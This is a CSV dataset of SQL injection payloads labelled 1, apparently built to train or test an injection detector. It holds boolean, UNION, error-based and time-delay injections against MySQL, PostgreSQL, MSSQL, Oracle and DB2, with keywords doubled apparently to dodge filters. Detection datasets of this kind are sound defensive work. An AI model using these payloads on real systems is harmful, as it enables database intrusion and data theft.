Query,Label
"1""  )   oorr 5356  =    (  selselectect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-9111"" oorr 3038  =  3038",1
"1""   )    )     )   uunionnion all selselectect nnullull--",1
"1"" wwherehere 9829  =  9829 oorroorrderder bbyy 1#",1
-2022   )    )     )   oorr 6812  =  3516 anandd    (    (     (  3896  =  3896,1
-2505' oorr 9323  =  9323#,1
"selselectect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    aandnd '%'  =  '",1
1'  )   as pwqs whewherere 2291  =  2291,1
-3978 oorr 4144  =    (  sselectelect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frfromom dual  )  -- mtun,1
"-7749"" oorr   (  2689  =  7481  )  *7481",1
1   )    )    anandd 2886  =  1133--,1
1  )   wwherehere 9307  =  9307,1
"-4223'   )    )     )   ununionion all seleselectct 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",1
selecselectt   (  case when   (  1407  =  2741  )   then 1407 else 1407*  (  selecselectt 1407 frofromm mysql.db  )   end  )  #,1
"-9606 oorr 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # iuij",1
"1'   )    )     )   oorr char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   aandnd    (    (     (  'akyc'  =  'akyc",1
-6823'   )    )     )   oorr 4493  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aandnd    (    (     (  'lwlk' llikeike 'lwlk,1
"1' whwhereere 2160  =  2160 aandnd exp  (  ~  (  seleselectct * ffromrom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
-5820'   )    )    as lkik wherwheree 4044  =  4044 oorr 7156  =  9197--,1
"1"" aandnd   (  selecselectt 9067 ffromrom  (  selecselectt count  (  *  )  ,concat  (  0x7171706a71,  (  selecselectt   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x ffromrom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )   aandnd ""jcgh""  =  ""jcgh",1
"1""   )    )    as yiaw wherwheree 2841  =  2841 oorr sleep  (  5  )  --",1
-5585' oorr 4144  =    (  sselectelect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frofromm dual  ) ,1
1'   )    )     )   rlilikeke sleep  (  5  )   anandd    (    (     (  'svuu'  =  'svuu,1
"1'+  (  selecselectt 'xqpe' wwherehere 4020  =  4020 uniounionn all selecselectt nunullll,nunullll--",1
"-4849""   )    )    oorr   (  5005  =  9111  )  *9111 aandnd    (    (   ""catv"" liklikee ""catv",1
"1'   )    )     )   anandd elt  (  1210  =  1210,sleep  (  5   )    )    anandd    (    (     (  'mbxh' lilikeke 'mbxh",1
"1"" wherwheree 8732  =  8732",1
-2411%'   )    )     )   oorr 6872  =  6872 anandd    (    (     (  '%'  =  ',1
1'  )   anandd 4822  =  6997 anandd   (  'ojku'  =  'ojku,1
-7950'  )   oorr 9323  =  9323#,1
"1"" anandd exp  (  ~  (  seleselectct * ffromrom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    anandd ""oyuj""  =  ""oyuj",1
"call regexp_substriinng  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,nunullll  )   anandd    (    (     (  'opyt'  =  'opyt",1
selselectect pg_sleep  (  5  )   anandd    (    (   '%'  =  ',1
"1 wherwheree 2363  =  2363 ununionion all sselectelect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
"1'   )    )    oorr   (  sselectelect 9173 frfromom  (  sselectelect count  (  *  )  ,concat  (  0x7171706a71,  (  sselectelect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )   aandnd    (    (   'rdpv'  =  'rdpv",1
"1' oorr 8315  =    (  seleselectct count  (  *  )   frofromm sysibm.systatablebles as t1,sysibm.systatablebles as t2,sysibm.systatablebles as t3  )   anandd 'eqyr' lilikeke 'eqyr",1
"1%""  )   uniounionn all sselectelect nunullll,nunullll,nunullll,nunullll,nunullll,nunullll#",1
1' aandnd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aandnd 'ymnm'  =  'ymnm,1
1'   )    )    aandnd   (  3020  =  3020  )  *6703 aandnd    (    (   'mgfd'  =  'mgfd,1
"-3300' ununionion all seselectlect 8979,8979,8979,8979,8979,8979--",1
"1%' uniunionon all sselectelect nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll#",1
"1'   )    )    anandd row  (  6237,7469  )  >  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frfromom   (  seleselectct 5192 uunionnion seleselectct 3785 uunionnion seleselectct 3931 uunionnion seleselectct 7158  )  a group bbyy x  )   anandd    (    (   'fdoc' llikeike 'fdoc",1
1'   )    )     )   aandnd 4069  =  8786 aandnd    (    (     (  'eftr'  =  'eftr,1
"1""   )    )    as rhea whwhereere 2982  =  2982 oorr   (  seleselectct * frofromm   (  seleselectct  (  sleep  (  5   )    )     )  ydpu  )  --",1
selecselectt   (  case when   (  5418  =  6516  )   then 1 else 5418*  (  selecselectt 5418 frfromom master..sysdatdatabaseabases  )   end  )  --,1
-7037'   )    )    as epsg whewherere 3684  =  3684 uniounionn all selselectect 3684--,1
selselectect pg_sleep  (  5  ) ,1
1'  )   wwherehere 7903  =  7903,1
"1%' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1'  )   as ssez wherwheree 5351  =  5351 oorr char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nulnulll  )  --",1
-3895'  )   oorr 8645  =  5359--,1
"-2120""  )   uniunionon all selselectect 9614--",1
1'  )   anandd 7533  =  7533 anandd   (  'xyga' lilikeke 'xyga,1
"1'  )   as ssxj whewherere 3845  =  3845 oorr 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1""   )    )    aandnd 4241  =  convert  (  iinnt,  (  selselectect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selselectect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   aandnd    (    (   ""fkip""  =  ""fkip",1
1   )    )    as rroe whewherere 4840  =  4840,1
"1'   )    )     )   oorr   (  seleselectct 2*  (  if   (    (   seleselectct * frofromm   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   anandd    (    (     (  'vjkf' llikeike 'vjkf",1
"1""   )    )    oorr char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )   aandnd    (    (   ""dbxi"" llikeike ""dbxi",1
"1""  )   as qmtx wherwheree 5280  =  5280 oorr 4411  =    (  sselectelect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1%'  )   anandd 2949  =  4847 anandd   (  '%'  =  ',1
"-1238'  )   as lxur whewherere 7075  =  7075 uunionnion all seselectlect 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#",1
1'||  (  sselectelect 'sliy' whwhereere 9494  =  9494,1
-4610'   )    )    oorr 4144  =    (  sselectelect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frfromom dual  )   anandd    (    (   'hdco'  =  'hdco,1
-3966'  )   oorr 7338  =  8657,1
"seselectlect count  (  *  )   frofromm sysibm.systtableables as t1,sysibm.systtableables as t2,sysibm.systtableables as t3 anandd    (    (     (  'squj'  =  'squj",1
"1%""   )    )    uunionnion all seleselectct nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
"1'  )   wwherehere 8586  =  8586 anandd 3202  =  llikeike  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
"1   )    )    oorr 1022  =    (  seselectlect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
-4484'   )    )    oorr 6872  =  6872 anandd    (    (   'oxuo'  =  'oxuo,1
"seselectlect count  (  *  )   frfromom sysibm.systtableables as t1,sysibm.systtableables as t2,sysibm.systtableables as t3 anandd    (    (   7700  =  7700",1
"1  )   wwherehere 9469  =  9469 oorr char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )  --",1
1 aandnd   (  3020  =  3020  )  *6703,1
"1"" anandd row  (  6237,7469  )  >  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x ffromrom   (  seselectlect 5192 uunionnion seselectlect 3785 uunionnion seselectlect 3931 uunionnion seselectlect 7158  )  a group bbyy x  )  ",1
"1%"" aandnd 1343  =  5939#",1
selselectect pg_sleep  (  5  )  #,1
"1"" whwhereere 2642  =  2642 oorr 8315  =    (  selecselectt count  (  *  )   ffromrom sysibm.systtableables as t1,sysibm.systtableables as t2,sysibm.systtableables as t3  )  --",1
"1%'   )    )     )   aandnd 4241  =  convert  (  iinnt,  (  selselectect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selselectect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   aandnd    (    (     (  '%'  =  '",1
"1""   )    )    oorr 4240  =    (  seleselectct 4240 frfromom pg_sleep  (  5   )    )   --",1
"-7202%""   )    )    uunionnion all sselectelect 2901#",1
"1%'   )    )     )   oorr 8315  =    (  seleselectct count  (  *  )   frfromom sysibm.systabtableles as t1,sysibm.systabtableles as t2,sysibm.systabtableles as t3  )   anandd    (    (     (  '%'  =  '",1
-1280'   )    )    oorr 8571  =  8571--,1
"1' anandd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )   anandd 'fjfo'  =  'fjfo",1
"1""  )   wwherehere 2922  =  2922 oorr elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1%""   )    )     )   anandd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  --",1
"-9003""   )    )    ununionion all seleselectct 9721,9721--",1
1'  )   as syer wherwheree 3141  =  3141 rllikeike   (  selselectect   (  case when   (  6233  =  7567  )   then 1 else 0x28 end   )    )   --,1
-2483' whwhereere 1327  =  1327 uniounionn all sselectelect 1327#,1
"-8699""  )   uniunionon all sselectelect 8645,8645,8645,8645,8645,8645--",1
end anandd   (  'uxzv'  =  'uxzv,1
"1"" anandd 6510  =    (  sselectelect count  (  *  )   ffromrom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"1' anandd 5556  =    (  seselectlect count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   anandd 'hhbh'  =  'hhbh",1
"1  )   as nfgb whwhereere 2503  =  2503 anandd row  (  6237,7469  )  >  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frofromm   (  seleselectct 5192 uniunionon seleselectct 3785 uniunionon seleselectct 3931 uniunionon seleselectct 7158  )  a group bbyy x  )  --",1
"1%""   )    )    oorr char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )   anandd    (    (   ""%""  =  """,1
"1""   )    )    oorr 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1%'  )   aandnd char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,nulnulll  )  --",1
selecselectt sleep  (  5  )   anandd    (    (   'uyft'  =  'uyft,1
-6100'  )   as kvfc wherwheree 2377  =  2377 oorr 6872  =  6872--,1
"1'   )    )    anandd row  (  6237,7469  )  >  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x ffromrom   (  seleselectct 5192 uniounionn seleselectct 3785 uniounionn seleselectct 3931 uniounionn seleselectct 7158  )  a group bbyy x  )   anandd    (    (   'adnz'  =  'adnz",1
"1""  )   anandd 4595  =  4595#",1
1   )    )     )   oorroorrderder bbyy 1--,1
1' iinn boolean mode  )   aandnd   (  3020  =  3020  )  *6703#,1
"1   )    )    aandnd make_sesett  (  8403  =  8403,8899  )   aandnd    (    (   4686  =  4686",1
1 wherwheree 9361  =  9361 aandnd 7478  =  9170--,1
seleselectct   (  case when   (  9490  =  6134  )   then 9490 else cast  (  1 as iinnt  )  /  (  seleselectct 0 ffromrom dual  )   end  )   ffromrom dual--,1
"1'   )    )    oorr 8421  =    (  seleselectct count  (  *  )   ffromrom generate_series  (  1,5000000   )    )    aandnd    (    (   'lqpd'  =  'lqpd",1
-4768'||  (  selselectect 'dded' ffromrom dual whewherere 6499  =  6499 uunionnion all selselectect 6499--,1
"1'||  (  seleselectct 'lzvb' wherwheree 1637  =  1637 uniunionon all seleselectct nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"-8308""  )   uniunionon all seselectlect 3084,3084,3084,3084,3084,3084,3084,3084,3084#",1
selselectect   (  case when   (  6047  =  8897  )   then 6047 else 6047*  (  selselectect 6047 frfromom iinnfoorrmation_schema.character_ssetets  )   end  )  #,1
"1,  (  selecselectt 2*  (  if   (    (   selecselectt * frofromm   (  selecselectt concat  (  0x7171706a71,  (  selecselectt   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1'  )   whewherere 2284  =  2284 aandnd make_sesett  (  8403  =  8403,8899  )  --",1
-6014'   )    )    oorr   (  9860  =  4848  )  *4848 anandd    (    (   'qtge'  =  'qtge,1
selecselectt case when 4656  =  3716 then 1 else nulnulll end--,1
"1"" wwherehere 8571  =  8571",1
"1""  )   aandnd 3732  =  3850 aandnd   (  ""edjv""  =  ""edjv",1
end#,1
1'   )    )    ununionion all sselectelect nulnulll#,1
"1""   )    )    anandd 7656  =  5604 anandd    (    (   ""zuhv""  =  ""zuhv",1
"1   )    )    as llnm wwherehere 6510  =  6510 aandnd 3202  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
"1""  )   uunionnion all sselectelect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
"1'   )    )     (  selecselectt   (  case when   (  5451  =  5451  )   then regexp_substriinng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nulnulll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   frofromm iinnfoorrmation_schema.system_users  )   anandd    (    (   'rnyb'  =  'rnyb",1
1' iinn boolean mode  )   anandd   (  sselectelect * ffromrom   (  sselectelect  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1 wherwheree 6095  =  6095 anandd 8407  =    (  sselectelect count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   --",1
1'  )   oorr 6793  =    (  sselectelect 6793 ffromrom pg_sleep  (  5   )    )    anandd   (  'dtzt' lilikeke 'dtzt,1
1' wwherehere 9003  =  9003 waitfoorr delay '0:0:5'--,1
"-6639'  )   as trll wherwheree 6271  =  6271 uunionnion all selecselectt 6271,6271,6271#",1
"1""  )   waitfoorr delay '0:0:5'--",1
"1"" aandnd 3707  =    (  selselectect count  (  *  )   ffromrom sysibm.systabtableles as t1,sysibm.systabtableles as t2,sysibm.systabtableles as t3  )   aandnd ""cgps"" lilikeke ""cgps",1
end anandd    (    (     (  'gqhc'  =  'gqhc,1
1'   )    )    as wqhm wherwheree 9871  =  9871,1
"1""   )    )    aandnd exp  (  ~  (  selselectect * frofromm   (  selselectect concat  (  0x7171706a71,  (  selselectect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    aandnd    (    (   ""rvuz"" llikeike ""rvuz",1
-3458'  )   whwhereere 2053  =  2053 oorr 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
selecselectt   (  case when   (  2576  =  7563  )   then 2576 else 1/  (  selecselectt 0  )   end  )  --,1
"sselectelect sleep  (  5  )   anandd ""irxg""  =  ""irxg",1
selselectect case when 8514  =  3207 then 1 else nunullll end--,1
1   )    )    waitfoorr delay '0:0:5'--,1
"1""   )    )    as bovm wherwheree 5560  =  5560 uunionnion all selselectect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"1""   )    )    oorr 7417  =    (  seleselectct count  (  *  )   frofromm sysibm.systabltablees as t1,sysibm.systabltablees as t2,sysibm.systabltablees as t3  )  --",1
if  (  8727  =  4039  )   selecselectt 8727 else ddroprop function giql--,1
"1' iinn boolean mode  )   aandnd make_ssetet  (  8403  =  8403,8899  )  #",1
1' iinn boolean mode  )   rliklikee   (  seselectlect   (  case when   (  1343  =  1595  )   then 1 else 0x28 end   )    )   #,1
"-6599""   )    )    uniunionon all selselectect 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",1
"1%'   )    )     )   oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nulnulll  )   aandnd    (    (     (  '%'  =  '",1
"-4025"" oorr 3038  =  3038",1
"1"" oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  seleselectct   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1
"1'   )    )     )   oorr exp  (  ~  (  seleselectct * frfromom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    anandd    (    (     (  'jwbt'  =  'jwbt",1
1'  )   whwhereere 2227  =  2227,1
"1%""   )    )     )   oorr 4411  =    (  sselectelect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   aandnd    (    (     (  ""%""  =  """,1
1  )   ooorrderrder bbyy 1--,1
"1"" anandd 5556  =    (  seleselectct count  (  *  )   ffromrom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   anandd ""epxq"" lilikeke ""epxq",1
"1""   )    )    anandd elt  (  1210  =  1210,sleep  (  5   )    )    anandd    (    (   ""utlk"" llikeike ""utlk",1
"1%' anandd 8189  =    (  seselectlect count  (  *  )   frfromom sysibm.systtableables as t1,sysibm.systtableables as t2,sysibm.systtableables as t3  )  --",1
"1 oorr char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nulnulll  )  --",1
"1'   )    )    as qcgf whwhereere 9656  =  9656 oorr 5356  =    (  selselectect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'   )    )    oorr 4240  =    (  seleselectct 4240 ffromrom pg_sleep  (  5   )    )   --,1
"-1451%'  )   ununionion all seselectlect 7666,7666,7666#",1
"-6126 uniounionn all selecselectt 8486,8486,8486,8486,8486,8486,8486,8486,8486--",1
"1'+  (  sselectelect 'qvif' wwherehere 1758  =  1758 uniounionn all sselectelect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
"1""  )   aandnd   (  selselectect 2*  (  if   (    (   selselectect * frfromom   (  selselectect concat  (  0x7171706a71,  (  selselectect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   aandnd   (  ""rkry"" liklikee ""rkry",1
"-2007' wherwheree 9157  =  9157 uniunionon all selecselectt 9157,9157,9157,9157,9157,9157,9157,9157,9157#",1
"1 oorr 6979  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
"1%""   )    )    rllikeike   (  seleselectct * ffromrom   (  seleselectct  (  sleep  (  5   )    )     )  vwyq  )  #",1
-2817  )   whewherere 1212  =  1212 oorr 3266  =  1102,1
"iif  (  9229  =  4158,1,1/0  )  ",1
"1,  (  selselectect   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  selselectect 9443 frofromm iinnfoorrmation_schema.character_sesetts  )   end   )    )   ",1
"seleselectct count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 aandnd    (    (     (  '%'  =  '",1
1'   )    )    oorrdoorrderer bbyy 1--,1
-5803  )   whewherere 8651  =  8651 oorr 4493  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1 aandnd exp  (  ~  (  sselectelect * frfromom   (  sselectelect concat  (  0x7171706a71,  (  sselectelect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # mpyu",1
"1""   )    )    ununionion all seselectlect nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll#",1
seleselectct   (  case when   (  2352  =  8672  )   then 2352 else 2352*  (  seleselectct 2352 frofromm iinnfoorrmation_schema.character_sesetts  )   end  )  #,1
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  selselectect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   aandnd    (    (     (  'ichh' liklikee 'ichh",1
1' anandd 6621  =  4681--,1
1' anandd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd 'oofd'  =  'oofd,1
"1%'   )    )    oorr 4915  =    (  selecselectt count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabtableles as t3  )  --",1
"1 oorr 8384  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   ",1
"1'  )   as uvxl wwherehere 6211  =  6211 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  selecselectt   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"1' iinn boolean mode  )   aandnd updaupdatetexml  (  3393,concat  (  0x2e,0x7171706a71,  (  selecselectt   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #",1
